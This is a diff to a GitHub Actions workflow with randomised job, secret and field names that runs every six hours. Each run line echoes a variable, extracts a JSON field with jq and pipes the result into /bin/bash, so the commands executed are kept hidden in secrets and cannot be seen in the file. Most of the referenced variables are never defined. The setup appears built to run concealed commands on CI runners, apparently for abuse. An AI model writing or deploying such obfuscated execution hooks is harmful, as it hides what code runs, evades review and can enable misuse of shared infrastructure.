@@ -1,9 +1,8 @@
 name: orchidslabored
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 5/6 * * *'
+    - cron: '49 4/6 * * *'
 
 jobs:
   build:
@@ -13,12 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: orchidslabored
         env:
-          chfz58: ${{ secrets.chfz58 }}
+          c91: ${{ secrets.c91 }}
         run: |
-          echo $chfz58 | jq -r .o708 | /bin/bash
-          echo $fbrbn682 | jq -r .jxixf698 | /bin/bash
-          echo $oosxp600 | jq -r .wag0387 | /bin/bash
-          echo $vuug8 | jq -r .x52113 | /bin/bash
-          echo $hdzxd7 | jq -r .sd2 | /bin/bash
-          echo $dgni95 | jq -r .tp38067 | /bin/bash
+          echo $c91 | jq -r .mvva15358 | /bin/bash
+          echo $pqbis17661 | jq -r .rwfpw55213 | /bin/bash
+          echo $a79409 | jq -r .fyea4 | /bin/bash
+          echo $rvxdy2 | jq -r .qk89 | /bin/bash
+          echo $ezmur3077 | jq -r .bdwx8 | /bin/bash
+          echo $fu90 | jq -r .z4009 | /bin/bash
+          echo $x42894 | jq -r .inr72 | /bin/bash
+          echo $cuk2 | jq -r .vevap26 | /bin/bash
+          echo $suypi53172 | jq -r .d80 | /bin/bash
+          echo $lhhag82946 | jq -r .ppywb4940 | /bin/bash
+          echo $ot2 | jq -r .etx14 | /bin/bash
+          echo $tzmm18252 | jq -r .yufj8 | /bin/bash
+          echo $yj97 | jq -r .tz0 | /bin/bash
 
